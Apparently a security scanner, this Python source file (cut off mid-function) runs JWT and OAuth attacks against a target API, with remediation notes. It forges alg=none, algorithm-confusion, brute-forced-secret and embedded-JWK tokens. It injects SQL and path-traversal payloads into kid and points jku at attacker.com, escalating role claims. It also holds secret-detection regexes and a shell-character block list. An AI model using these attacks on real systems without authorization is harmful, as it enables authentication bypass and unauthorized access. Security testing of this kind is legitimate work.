import subprocess
import json
import re
import time
import base64
import hashlib
import hmac
import requests
import concurrent.futures
from typing import Optional, Any
from pydantic import BaseModel, Field, validator

# ══════════════════════════════════════════════════════════════
# 1. SCHEMAS
# ══════════════════════════════════════════════════════════════

class APIAuthTestRequest(BaseModel):
    tool: str
    target: str
    args: list[str] = []
    timeout: int = Field(default=600, ge=30, le=7200)
    token: Optional[str] = None           # JWT or Bearer token to test
    api_key: Optional[str] = None         # API key to test
    endpoints: list[str] = []             # specific endpoints to test
    headers: dict[str, str] = {}          # extra headers
    wordlist: Optional[str] = None        # for brute-force tests
    user_ids: list[Any] = []              # for IDOR tests
    credentials: dict[str, str] = {}      # {"username": "...", "password": "..."}

    @validator("tool")
    def validate_tool(cls, v):
        allowed = {"jwt_tool", "manual", "burp"}
        if v not in allowed:
            raise ValueError(f"Tool '{v}' not allowed. Use: {allowed}")
        return v

    @validator("target")
    def validate_target(cls, v):
        blocked = ["127.0.0.1", "localhost", "0.0.0.0", "::1"]
        if v.strip() in blocked:
            raise ValueError(f"Target '{v}' is blocked")
        domain  = r"^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}"
        bare    = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}$"
        ip_http = r"^https?://(\d{1,3}\.){3}\d{1,3}"
        if not (re.match(domain, v) or re.match(bare, v) or re.match(ip_http, v)):
            raise ValueError(f"Invalid target: {v}")
        return v.strip()

    @validator("args")
    def validate_args(cls, v):
        dangerous = [";", "&&", "||", "|", "`", "$(", ">>", "'", '"']
        blocked   = ["-o", "--output", "-O"]
        for arg in v:
            for c in dangerous:
                if c in arg:
                    raise ValueError(f"Dangerous char '{c}' in: {arg}")
            for f in blocked:
                if arg.strip() == f:
                    raise ValueError(f"Blocked flag: {f}")
        return v


# ── JWT decode result ──
class JWTInfo(BaseModel):
    raw: str
    header: dict[str, Any] = {}
    payload: dict[str, Any] = {}
    signature: Optional[str] = None
    algorithm: Optional[str] = None
    is_expired: bool = False
    expiry: Optional[str] = None
    issued_at: Optional[str] = None
    subject: Optional[str] = None
    issuer: Optional[str] = None
    audience: Optional[str] = None
    kid: Optional[str] = None             # Key ID header
    jku: Optional[str] = None             # JWK Set URL
    x5u: Optional[str] = None             # X.509 URL


# ── Single auth vulnerability finding ──
class AuthFinding(BaseModel):
    test_name: str
    category: str                          # jwt / oauth / idor / rate_limit /
                                           # api_key / broken_auth / bola
    severity: str = "info"                 # info/low/medium/high/critical
    vulnerable: bool = False
    description: str = ""
    evidence: list[str] = []
    request_snippet: Optional[str] = None
    response_snippet: Optional[str] = None
    remediation: list[str] = []
    cvss: Optional[str] = None


# ── IDOR test result ──
class IDORResult(BaseModel):
    endpoint: str
    method: str = "GET"
    own_id: Any = None
    tested_id: Any = None
    accessible: bool = False
    status_code: Optional[int] = None
    response_snippet: Optional[str] = None
    severity: str = "info"
    evidence: list[str] = []


# ── Rate limit test result ──
class RateLimitResult(BaseModel):
    endpoint: str
    requests_sent: int = 0
    blocked_at: Optional[int] = None       # request number where block started
    status_codes: list[int] = []
    rate_limit_headers: dict[str, str] = {}
    bypass_successful: bool = False
    bypass_technique: Optional[str] = None
    vulnerable: bool = False
    evidence: list[str] = []


# ── API key leak result ──
class APIKeyLeak(BaseModel):
    location: str                          # header / body / url / env
    key_type: Optional[str] = None         # AWS / GitHub / Stripe / etc.
    key_value: str = ""                    # first 8 chars only
    endpoint: Optional[str] = None
    valid: bool = False                    # tried to verify
    evidence: list[str] = []
    severity: str = "high"


# ── Final result ──
class APIAuthTestResult(BaseModel):
    success: bool
    tool: str
    target: str
    command: str
    jwt_info: Optional[JWTInfo] = None
    findings: list[AuthFinding] = []
    idor_results: list[IDORResult] = []
    rate_limit_results: list[RateLimitResult] = []
    api_key_leaks: list[APIKeyLeak] = []
    total_findings: int = 0
    total_vulnerable: int = 0
    critical_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    raw_output: Optional[str] = None
    error: Optional[str] = None
    execution_time: float = 0.0
    techniques_used: list[str] = []


# ══════════════════════════════════════════════════════════════
# 2. JWT UTILITIES
# ══════════════════════════════════════════════════════════════

def b64_decode_pad(s: str) -> bytes:
    """Base64url decode with padding."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def b64_encode_url(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt_decode(token: str) -> Optional[JWTInfo]:
    """
    Decode a JWT token without verification.
    Extract header, payload, signature and all claims.
    """
    import datetime

    try:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None

        header  = json.loads(b64_decode_pad(parts[0]))
        payload = json.loads(b64_decode_pad(parts[1]))
        sig     = parts[2]

        info = JWTInfo(
            raw=token,
            header=header,
            payload=payload,
            signature=sig,
            algorithm=header.get("alg"),
            kid=header.get("kid"),
            jku=header.get("jku"),
            x5u=header.get("x5u"),
        )

        # Claims
        info.subject  = str(payload.get("sub", "")) or None
        info.issuer   = str(payload.get("iss", "")) or None
        info.audience = str(payload.get("aud", "")) or None

        # Expiry
        exp = payload.get("exp")
        if exp:
            try:
                exp_dt = datetime.datetime.utcfromtimestamp(int(exp))
                info.expiry    = exp_dt.isoformat()
                info.is_expired = exp_dt < datetime.datetime.utcnow()
            except Exception:
                pass

        # Issued at
        iat = payload.get("iat")
        if iat:
            try:
                iat_dt = datetime.datetime.utcfromtimestamp(int(iat))
                info.issued_at = iat_dt.isoformat()
            except Exception:
                pass

        return info

    except Exception:
        return None


def jwt_build(header: dict, payload: dict, secret: str = "",
              algorithm: str = "HS256") -> str:
    """
    Build a signed JWT token.
    Supports: HS256/384/512, none algorithm.
    """
    h = b64_encode_url(json.dumps(header, separators=(",", ":")).encode())
    p = b64_encode_url(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}"

    if algorithm.lower() == "none":
        return f"{msg}."

    hash_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = hash_map.get(algorithm.upper())
    if not hash_fn:
        return f"{msg}."

    sig = hmac.new(
        secret.encode() if isinstance(secret, str) else secret,
        msg.encode(),
        hash_fn,
    ).digest()
    return f"{msg}.{b64_encode_url(sig)}"


# ══════════════════════════════════════════════════════════════
# 3. API KEY PATTERNS
# ══════════════════════════════════════════════════════════════

API_KEY_PATTERNS: list[dict] = [
    # AWS
    {"name": "AWS Access Key",
     "pattern": r"AKIA[0-9A-Z]{16}",
     "severity": "critical"},
    {"name": "AWS Secret Key",
     "pattern": r"(?i)aws_secret_access_key\s*[=:]\s*[A-Za-z0-9+/]{40}",
     "severity": "critical"},
    # GitHub
    {"name": "GitHub Token",
     "pattern": r"gh[pousr]_[A-Za-z0-9]{36,255}",
     "severity": "critical"},
    {"name": "GitHub OAuth",
     "pattern": r"gho_[A-Za-z0-9]{36}",
     "severity": "critical"},
    # Stripe
    {"name": "Stripe Live Key",
     "pattern": r"sk_live_[0-9a-zA-Z]{24,}",
     "severity": "critical"},
    {"name": "Stripe Test Key",
     "pattern": r"sk_test_[0-9a-zA-Z]{24,}",
     "severity": "medium"},
    # Slack
    {"name": "Slack Token",
     "pattern": r"xox[baprs]-[0-9A-Za-z\-]{10,48}",
     "severity": "high"},
    {"name": "Slack Webhook",
     "pattern": r"https://hooks\.slack\.com/services/[A-Z0-9]+/[A-Z0-9]+/[A-Za-z0-9]+",
     "severity": "high"},
    # Google
    {"name": "Google API Key",
     "pattern": r"AIza[0-9A-Za-z\-_]{35}",
     "severity": "high"},
    {"name": "Google OAuth",
     "pattern": r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
     "severity": "medium"},
    # Generic JWT
    {"name": "JWT Token",
     "pattern": r"eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*",
     "severity": "high"},
    # Generic Bearer
    {"name": "Bearer Token",
     "pattern": r"(?i)bearer\s+[A-Za-z0-9\-_\.]{20,}",
     "severity": "medium"},
    # Generic API Key
    {"name": "Generic API Key",
     "pattern": r"(?i)(api[_\-]?key|apikey|api_secret)\s*[=:]\s*[A-Za-z0-9\-_\.]{16,}",
     "severity": "high"},
    # Twilio
    {"name": "Twilio API Key",
     "pattern": r"SK[0-9a-fA-F]{32}",
     "severity": "high"},
    # Mailgun
    {"name": "Mailgun API Key",
     "pattern": r"key-[0-9a-zA-Z]{32}",
     "severity": "high"},
    # SendGrid
    {"name": "SendGrid API Key",
     "pattern": r"SG\.[a-zA-Z0-9\-_\.]{22,}\.[a-zA-Z0-9\-_\.]{43,}",
     "severity": "critical"},
    # Heroku
    {"name": "Heroku API Key",
     "pattern": r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}"
                r"-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}",
     "severity": "medium"},
    # Private Keys
    {"name": "RSA Private Key",
     "pattern": r"-----BEGIN RSA PRIVATE KEY-----",
     "severity": "critical"},
    {"name": "Private Key",
     "pattern": r"-----BEGIN (?:EC|DSA|OPENSSH) PRIVATE KEY-----",
     "severity": "critical"},
    # Database URLs
    {"name": "Database URL",
     "pattern": r"(?i)(mysql|postgresql|mongodb|redis)"
                r"://[^:\s]+:[^@\s]+@[^\s]+",
     "severity": "critical"},
    # Basic Auth in URL
    {"name": "Basic Auth in URL",
     "pattern": r"https?://[^:\s]+:[^@\s]+@",
     "severity": "high"},
]


def scan_for_api_keys(content: str,
                       location: str,
                       endpoint: Optional[str] = None) -> list[APIKeyLeak]:
    """Scan a string for known API key patterns."""
    leaks: list[APIKeyLeak] = []
    seen:  set[str] = set()

    for kp in API_KEY_PATTERNS:
        for m in re.finditer(kp["pattern"], content, re.MULTILINE):
            val     = m.group(0)
            val_key = val[:30]
            if val_key in seen:
                continue
            seen.add(val_key)

            leaks.append(APIKeyLeak(
                location=location,
                key_type=kp["name"],
                key_value=val[:8] + "..." if len(val) > 8 else val,
                endpoint=endpoint,
                severity=kp["severity"],
                evidence=[
                    f"Pattern '{kp['name']}' matched in {location}: "
                    f"{val[:20]}..."
                ],
            ))

    return leaks


# ══════════════════════════════════════════════════════════════
# 4. JWT ATTACK TESTS
# ══════════════════════════════════════════════════════════════

def test_jwt_none_algorithm(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 1: Algorithm confusion — set alg to 'none'.
    Remove signature entirely. Server should reject.
    """
    finding = AuthFinding(
        test_name="JWT None Algorithm",
        category="jwt",
        severity="critical",
        description=(
            "JWT 'none' algorithm bypass: set alg=none and remove signature. "
            "If server accepts, it performs no signature verification."
        ),
        remediation=[
            "Explicitly reject tokens with alg=none",
            "Use a whitelist of allowed algorithms server-side",
            "Never trust the alg header from the token itself",
        ],
        cvss="9.8",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    payload = info.payload.copy()

    # Try multiple none variations
    none_variants = ["none", "None", "NONE", "nOnE"]
    for variant in none_variants:
        forged_header  = {**info.header, "alg": variant}
        forged_token   = jwt_build(forged_header, payload,
                                    secret="", algorithm="none")

        test_headers = {
            **headers,
            "Authorization": f"Bearer {forged_token}",
        }

        try:
            resp = requests.get(
                endpoint,
                headers=test_headers,
                timeout=timeout,
                verify=False,
            )
            if resp.status_code in (200, 201, 204):
                finding.vulnerable = True
                finding.severity   = "critical"
                finding.evidence.append(
                    f"Server accepted alg='{variant}' token! "
                    f"HTTP {resp.status_code}"
                )
                finding.request_snippet  = f"Authorization: Bearer {forged_token[:60]}..."
                finding.response_snippet = resp.text[:300]
                break
            else:
                finding.evidence.append(
                    f"alg='{variant}' rejected (HTTP {resp.status_code}) ✓"
                )
        except Exception as e:
            finding.evidence.append(f"Request failed: {e}")

    return finding


def test_jwt_algorithm_confusion(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    public_key: Optional[str] = None,
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 2: RS256 → HS256 algorithm confusion.
    If server uses RS256, forge token with HS256 using public key as secret.
    """
    finding = AuthFinding(
        test_name="JWT Algorithm Confusion RS256→HS256",
        category="jwt",
        severity="critical",
        description=(
            "RS256→HS256 confusion: sign token with HS256 using the "
            "server's public key as the HMAC secret. "
            "Vulnerable if server switches from asymmetric to symmetric."
        ),
        remediation=[
            "Hard-code the expected algorithm server-side",
            "Never derive algorithm from the token header",
            "Use separate key material for asymmetric and symmetric algorithms",
        ],
        cvss="9.1",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    if info.algorithm not in ("RS256", "RS384", "RS512",
                               "ES256", "ES384", "ES512"):
        finding.evidence.append(
            f"Token uses {info.algorithm} — RS/ES→HS confusion not applicable"
        )
        return finding

    if not public_key:
        finding.evidence.append(
            "No public key provided — skipping RS256→HS256 confusion test. "
            "Provide public key via --pubkey for full test."
        )
        return finding

    try:
        forged_header = {**info.header, "alg": "HS256"}
        forged_token  = jwt_build(forged_header, info.payload,
                                   secret=public_key, algorithm="HS256")

        test_headers = {**headers, "Authorization": f"Bearer {forged_token}"}
        resp = requests.get(endpoint, headers=test_headers,
                            timeout=timeout, verify=False)

        if resp.status_code in (200, 201, 204):
            finding.vulnerable = True
            finding.evidence.append(
                f"RS256→HS256 confusion ACCEPTED! HTTP {resp.status_code}"
            )
            finding.response_snippet = resp.text[:300]
        else:
            finding.evidence.append(
                f"RS256→HS256 confusion rejected (HTTP {resp.status_code}) ✓"
            )
    except Exception as e:
        finding.evidence.append(f"Test failed: {e}")

    return finding


def test_jwt_weak_secret(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    wordlist_path: Optional[str] = None,
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 3: Brute-force weak HMAC secret.
    Tries common secrets, then wordlist if provided.
    """
    finding = AuthFinding(
        test_name="JWT Weak Secret Brute-Force",
        category="jwt",
        severity="critical",
        description=(
            "JWT signed with a weak/guessable secret. "
            "Attacker can forge arbitrary tokens."
        ),
        remediation=[
            "Use cryptographically random secret of at least 256 bits",
            "Never use predictable secrets (company name, 'secret', etc.)",
            "Consider switching to RS256 with asymmetric keys",
        ],
        cvss="9.8",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    if info.algorithm not in ("HS256", "HS384", "HS512"):
        finding.evidence.append(
            f"Algorithm {info.algorithm} is not HMAC — skipping brute-force"
        )
        return finding

    # Common weak secrets
    common_secrets = [
        "secret", "password", "123456", "admin", "key", "jwt",
        "token", "test", "dev", "development", "production",
        "changeme", "12345678", "qwerty", "abc123", "letmein",
        "master", "root", "toor", "pass", "api_key", "jwt_secret",
        "your-256-bit-secret", "supersecret", "mysecret",
        "access_token_secret", "refresh_token_secret",
        "your-secret-key", "secret-key", "secretkey",
        "", " ", "null", "undefined", "none",
        "HS256", "HS384", "HS512",
        info.issuer or "",
        info.subject or "",
        info.audience or "",
    ]

    # Load additional wordlist
    if wordlist_path:
        try:
            with open(wordlist_path, "r", errors="ignore") as f:
                common_secrets += [
                    line.strip() for line in f
                    if line.strip() and len(line.strip()) < 200
                ][:5000]    # cap at 5k entries
        except Exception as e:
            finding.evidence.append(f"Wordlist load error: {e}")

    parts = token.split(".")
    msg   = f"{parts[0]}.{parts[1]}".encode()

    hash_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = hash_map[info.algorithm]

    for secret in common_secrets:
        if not secret:
            continue
        try:
            expected_sig = hmac.new(
                secret.encode(), msg, hash_fn
            ).digest()
            expected_b64 = b64_encode_url(expected_sig)

            if expected_b64 == parts[2]:
                finding.vulnerable = True
                finding.severity   = "critical"
                finding.evidence.append(
                    f"WEAK SECRET FOUND: '{secret}'"
                )
                finding.remediation.insert(0, f"Rotate the compromised secret: '{secret}'")

                # Verify by forging a token
                forged = jwt_build(info.header, info.payload,
                                    secret=secret, algorithm=info.algorithm)
                test_hdrs = {**headers, "Authorization": f"Bearer {forged}"}
                try:
                    resp = requests.get(endpoint, headers=test_hdrs,
                                        timeout=timeout, verify=False)
                    finding.evidence.append(
                        f"Forged token with secret accepted: HTTP {resp.status_code}"
                    )
                except Exception:
                    pass
                break

        except Exception:
            continue

    if not finding.vulnerable:
        finding.evidence.append(
            f"Tested {len(common_secrets)} secrets — none matched. "
            "Secret appears strong."
        )

    return finding


def test_jwt_expiry_bypass(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    secret: Optional[str] = None,
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 4: Expired token acceptance.
    Send the existing expired token and check if server rejects it.
    If secret known, forge future-dated token.
    """
    finding = AuthFinding(
        test_name="JWT Expiry Bypass",
        category="jwt",
        severity="high",
        description=(
            "Server accepts expired JWT tokens without validating exp claim."
        ),
        remediation=[
            "Always validate exp claim server-side",
            "Use short-lived tokens (15 min for access tokens)",
            "Implement token revocation / denylist",
        ],
        cvss="7.5",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    # Test 1: Send token as-is (might be expired)
    test_headers = {**headers, "Authorization": f"Bearer {token}"}
    try:
        resp = requests.get(endpoint, headers=test_headers,
                            timeout=timeout, verify=False)
        if info.is_expired and resp.status_code in (200, 201, 204):
            finding.vulnerable = True
            finding.severity   = "high"
            finding.evidence.append(
                f"Expired token (exp: {info.expiry}) accepted! "
                f"HTTP {resp.status_code}"
            )
        elif info.is_expired:
            finding.evidence.append(
                f"Expired token correctly rejected: HTTP {resp.status_code} ✓"
            )
        else:
            finding.evidence.append(
                f"Token not expired yet (exp: {info.expiry})"
            )
    except Exception as e:
        finding.evidence.append(f"Request failed: {e}")

    # Test 2: Forge token with exp in past (if secret known)
    if secret:
        import datetime
        past_payload = {
            **info.payload,
            "exp": int((datetime.datetime.utcnow()
                        - datetime.timedelta(days=30)).timestamp()),
        }
        forged = jwt_build(info.header, past_payload,
                            secret=secret, algorithm=info.algorithm or "HS256")
        test_headers2 = {**headers, "Authorization": f"Bearer {forged}"}
        try:
            resp2 = requests.get(endpoint, headers=test_headers2,
                                 timeout=timeout, verify=False)
            if resp2.status_code in (200, 201, 204):
                finding.vulnerable = True
                finding.evidence.append(
                    f"Forged token with past exp accepted! HTTP {resp2.status_code}"
                )
        except Exception:
            pass

    return finding


def test_jwt_kid_injection(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 5: JWT kid (Key ID) SQL injection / path traversal.
    Inject SQL or path traversal into kid header parameter.
    """
    finding = AuthFinding(
        test_name="JWT kid Injection",
        category="jwt",
        severity="critical",
        description=(
            "JWT kid header parameter injectable. "
            "Server uses kid to look up signing key without sanitization. "
            "Payloads: SQL injection, path traversal to /dev/null."
        ),
        remediation=[
            "Validate and sanitize the kid claim before using it",
            "Use a fixed key registry — never derive key path from kid",
            "Parameterize any database queries using kid",
        ],
        cvss="9.1",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    kid_payloads = [
        # Path traversal → sign with empty key from /dev/null
        ("path_traversal", "../../../../../../dev/null",  ""),
        ("path_traversal", "../../../dev/null",           ""),
        ("path_traversal", "/dev/null",                   ""),
        # SQL injection — always-true condition
        ("sql_injection",  "' UNION SELECT 'attacker'--", "attacker"),
        ("sql_injection",  "x' OR '1'='1",                ""),
        ("sql_injection",  "x'; DROP TABLE keys;--",      ""),
        # Empty kid
        ("empty_kid",      "",                             ""),
    ]

    for injection_type, kid_val, secret in kid_payloads:
        forged_header = {**info.header, "kid": kid_val, "alg": "HS256"}
        forged_token  = jwt_build(forged_header, info.payload,
                                   secret=secret, algorithm="HS256")

        test_headers = {**headers, "Authorization": f"Bearer {forged_token}"}
        try:
            resp = requests.get(endpoint, headers=test_headers,
                                timeout=timeout, verify=False)
            if resp.status_code in (200, 201, 204):
                finding.vulnerable = True
                finding.severity   = "critical"
                finding.evidence.append(
                    f"kid {injection_type} ACCEPTED: kid='{kid_val[:30]}' "
                    f"→ HTTP {resp.status_code}"
                )
                finding.response_snippet = resp.text[:200]
            elif resp.status_code == 500:
                finding.evidence.append(
                    f"kid='{kid_val[:30]}' caused 500 — possible injection point"
                )
            else:
                finding.evidence.append(
                    f"kid {injection_type} rejected: HTTP {resp.status_code} ✓"
                )
        except Exception as e:
            finding.evidence.append(f"Request error: {e}")

    return finding


def test_jwt_jku_injection(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    attacker_jwks_url: Optional[str] = None,
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 6: JWT jku (JWK Set URL) / x5u header injection.
    Attacker points jku to their own JWKS endpoint.
    """
    finding = AuthFinding(
        test_name="JWT jku/x5u Header Injection",
        category="jwt",
        severity="critical",
        description=(
            "JWT jku header injection: server fetches JWK from attacker-controlled URL. "
            "Allows forging tokens signed with attacker's private key."
        ),
        remediation=[
            "Never fetch JWK from URLs specified in the token",
            "Use a pinned, server-side JWKS endpoint",
            "Validate jku against a strict allowlist if dynamic JWK is required",
        ],
        cvss="9.8",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    # Check if original token already has jku/x5u
    if info.jku:
        finding.evidence.append(f"Token already contains jku: {info.jku}")
    if info.x5u:
        finding.evidence.append(f"Token already contains x5u: {info.x5u}")

    test_urls = [
        attacker_jwks_url or "https://attacker.com/.well-known/jwks.json",
        "https://evil.com/jwks.json",
        "http://localhost:8080/jwks.json",     # SSRF via jku
        "https://attacker.com/jwks.json",
    ]

    for jku_url in test_urls[:2]:             # cap to 2 to avoid excessive requests
        forged_header = {**info.header, "jku": jku_url, "alg": "RS256"}
        # Build token with forged jku (signature won't verify without real key)
        forged_parts = [
            b64_encode_url(json.dumps(forged_header,
                                       separators=(",", ":")).encode()),
            b64_encode_url(json.dumps(info.payload,
                                       separators=(",", ":")).encode()),
            "forged_sig",
        ]
        forged_token = ".".join(forged_parts)

        test_hdrs = {**headers, "Authorization": f"Bearer {forged_token}"}
        try:
            resp = requests.get(endpoint, headers=test_hdrs,
                                timeout=timeout, verify=False)
            if resp.status_code in (200, 201, 204):
                finding.vulnerable = True
                finding.evidence.append(
                    f"jku injection ACCEPTED: {jku_url} → HTTP {resp.status_code}"
                )
            elif resp.status_code == 500:
                finding.evidence.append(
                    f"jku '{jku_url}' caused 500 — server may be fetching URL"
                )
                finding.vulnerable = True   # SSRF even if not accepted
            else:
                finding.evidence.append(
                    f"jku injection rejected: HTTP {resp.status_code} ✓"
                )
        except Exception as e:
            finding.evidence.append(f"jku test error: {e}")

    return finding


def test_jwt_claims_manipulation(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    secret: Optional[str] = None,
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 7: Privilege escalation via claim manipulation.
    Modify role, admin, scope, permissions claims.
    """
    finding = AuthFinding(
        test_name="JWT Claims Privilege Escalation",
        category="jwt",
        severity="high",
        description=(
            "Modify JWT claims (role, admin, scope) to escalate privileges. "
            "Only viable if secret is known or alg=none accepted."
        ),
        remediation=[
            "Do not rely solely on JWT claims for authorization",
            "Validate claims against server-side session store",
            "Use opaque tokens with server-side state",
        ],
        cvss="8.8",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    # Build privilege-escalated payloads
    privesc_payloads = []
    base = info.payload.copy()

    # Role escalation
    for role_key in ("role", "roles", "group", "groups", "type", "user_type"):
        if role_key in base:
            for admin_val in ("admin", "administrator", "superuser",
                               "root", "ADMIN", "staff", "manager"):
                p = base.copy()
                p[role_key] = admin_val
                privesc_payloads.append((f"{role_key}={admin_val}", p))
            break

    # Admin flag
    for admin_key in ("admin", "is_admin", "isAdmin", "administrator",
                       "is_superuser", "superuser"):
        p = base.copy()
        p[admin_key] = True
        privesc_payloads.append((f"{admin_key}=true", p))

    # Scope expansion
    if "scope" in base:
        p = base.copy()
        p["scope"] = "admin read write delete"
        privesc_payloads.append(("scope=admin", p))

    # Permission flags
    for perm_key in ("permissions", "authorities", "access"):
        p = base.copy()
        p[perm_key] = ["admin", "read", "write", "delete"]
        privesc_payloads.append((f"{perm_key}=['admin']", p))

    if not privesc_payloads:
        finding.evidence.append(
            "No role/admin claims found in payload to manipulate"
        )
        return finding

    for label, payload in privesc_payloads[:6]:   # cap tests
        # Try none algorithm
        forged_none = jwt_build(
            {**info.header, "alg": "none"}, payload,
            secret="", algorithm="none"
        )
        # Try with known secret
        forged_hmac = jwt_build(
            info.header, payload,
            secret=secret or "", algorithm=info.algorithm or "HS256"
        ) if secret else None

        for forged, method in [
            (forged_none, "none_alg"),
            (forged_hmac, "known_secret"),
        ]:
            if not forged:
                continue
            test_hdrs = {**headers, "Authorization": f"Bearer {forged}"}
            try:
                resp = requests.get(endpoint, headers=test_hdrs,
                                    timeout=timeout, verify=False)
                if resp.status_code in (200, 201, 204):
                    finding.vulnerable = True
                    finding.severity   = "high"
                    finding.evidence.append(
                        f"Claim escalation [{method}] ACCEPTED: "
                        f"{label} → HTTP {resp.status_code}"
                    )
                    finding.response_snippet = resp.text[:200]
            except Exception as e:
                finding.evidence.append(f"Claim test error: {e}")

    return finding


def test_jwt_embedded_jwk(
    token: str,
    endpoint: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test 8: Embedded JWK attack (CVE-2018-0114 style).
    Inject a self-signed JWK into the JWT header.
    """
    finding = AuthFinding(
        test_name="JWT Embedded JWK Attack",
        category="jwt",
        severity="critical",
        description=(
            "JWT header jwk injection: embed attacker's public key in header. "
            "Server uses embedded key to verify signature = always valid."
        ),
        remediation=[
            "Never use the jwk header parameter for signature verification",
            "Use server-side key registry only",
            "Reject tokens containing jwk, jku, x5c, x5u headers",
        ],
        cvss="9.8",
    )

    info = jwt_decode(token)
    if not info:
        finding.evidence.append("Could not decode token")
        return finding

    # Check if original has embedded jwk
    if "jwk" in info.header:
        finding.evidence.append(
            f"Token already contains embedded jwk: {str(info.header['jwk'])[:100]}"
        )
        finding.vulnerable = True
        finding.severity   = "critical"

    # Build a fake embedded JWK (attacker's "public key")
    fake_jwk = {
        "kty": "oct",
        "k":   b64_encode_url(b"attacker_secret_key_32_bytes_long"),
    }
    forged_header = {
        **info.header,
        "alg": "HS256",
        "jwk": fake_jwk,
    }
    forged_token = jwt_build(
        forged_header, info.payload,
        secret="attacker_secret_key_32_bytes_long",
        algorithm="HS256",
    )

    test_hdrs = {**headers, "Authorization": f"Bearer {forged_token}"}
    try:
        resp = requests.get(endpoint, headers=test_hdrs,
                            timeout=timeout, verify=False)
        if resp.status_code in (200, 201, 204):
            finding.vulnerable = True
            finding.evidence.append(
                f"Embedded JWK ACCEPTED! HTTP {resp.status_code}"
            )
            finding.response_snippet = resp.text[:200]
        else:
            finding.evidence.append(
                f"Embedded JWK rejected: HTTP {resp.status_code} ✓"
            )
    except Exception as e:
        finding.evidence.append(f"jwk test error: {e}")

    return finding


# ══════════════════════════════════════════════════════════════
# 5. OAUTH TESTS
# ══════════════════════════════════════════════════════════════

def test_oauth_token_leakage(
    target: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test OAuth token in URL, referrer, logs.
    """
    finding = AuthFinding(
        test_name="OAuth Token in URL",
        category="oauth",
        severity="high",
        description=(
            "OAuth access_token transmitted in URL query parameter. "
            "Tokens leak in browser history, logs, Referrer headers."
        ),
        remediation=[
            "Use Authorization header instead of URL parameters",
            "Use POST body for token transmission",
            "Implement PKCE for public clients",
        ],
        cvss="7.4",
    )

    # Check common OAuth endpoints for token-in-URL patterns
    oauth_paths = [
        "/oauth/callback",
        "/auth/callback",
        "/callback",
        "/oauth2/callback",
        "/signin-oidc",
    ]

    for path in oauth_paths:
        url = target.rstrip("/") + path + "?access_token=test_token_in_url"
        try:
            resp = requests.get(url, headers={**headers,
                                              "User-Agent": "APIAuthTester/1.0"},
                                timeout=timeout, verify=False,
                                allow_redirects=False)
            # If endpoint processes the token (not just redirect to login)
            if resp.status_code not in (301, 302, 303, 307, 308, 404):
                finding.evidence.append(
                    f"OAuth endpoint {path} processes token in URL: "
                    f"HTTP {resp.status_code}"
                )
                if resp.status_code in (200, 201):
                    finding.vulnerable = True
            else:
                finding.evidence.append(
                    f"OAuth path {path}: HTTP {resp.status_code}"
                )
        except Exception:
            pass

    return finding


def test_oauth_state_csrf(
    target: str,
    headers: dict[str, str],
    timeout: int = 8,
) -> AuthFinding:
    """
    Test missing state parameter in OAuth flow (CSRF).
    """
    finding = AuthFinding(
        test_name="OAuth Missing State Parameter (CSRF)",
        category="oauth",
        severity="high",
        description=(
            "OAuth authorization request missing state parameter. "
            "Vulnerable to CSRF attacks that force login as attacker."
        ),
        remediation=[
            "Always use a cryptographically random state parameter",
            "Validate state on callback",
            "Implement PKCE as additional protection",
        ],
        cvss="8.1",
    )

    oauth_auth_paths = [
        "/oauth/authorize",
        "/oauth2/authorize",
        "/auth/authorize",
        "/connect/authorize",
        "/authorize",
    ]

    for path in oauth_auth_paths:
        # Test without state
        url_no_state = (
            target.rstrip("/") + path
            + "?response_type=code&client_id=test&redirect_uri="
            + target + "/callback"
        )
        try:
            resp = requests.get(url_no_state, headers=headers,
                                timeout=timeout, verify=False,
                                allow_redirects=False)
            if resp.status_code not in (404, 400):
                loc = resp.headers.get("location", "")
                if "state" not in loc and resp.status_code in (200, 302):
                    finding.vulnerable = True
                    finding.evidence.append(
                        f"OAuth authorize endpoint {path} "
                        f"does not enforce state parameter: "
                        f"HTTP {resp.status_code}"
                    )
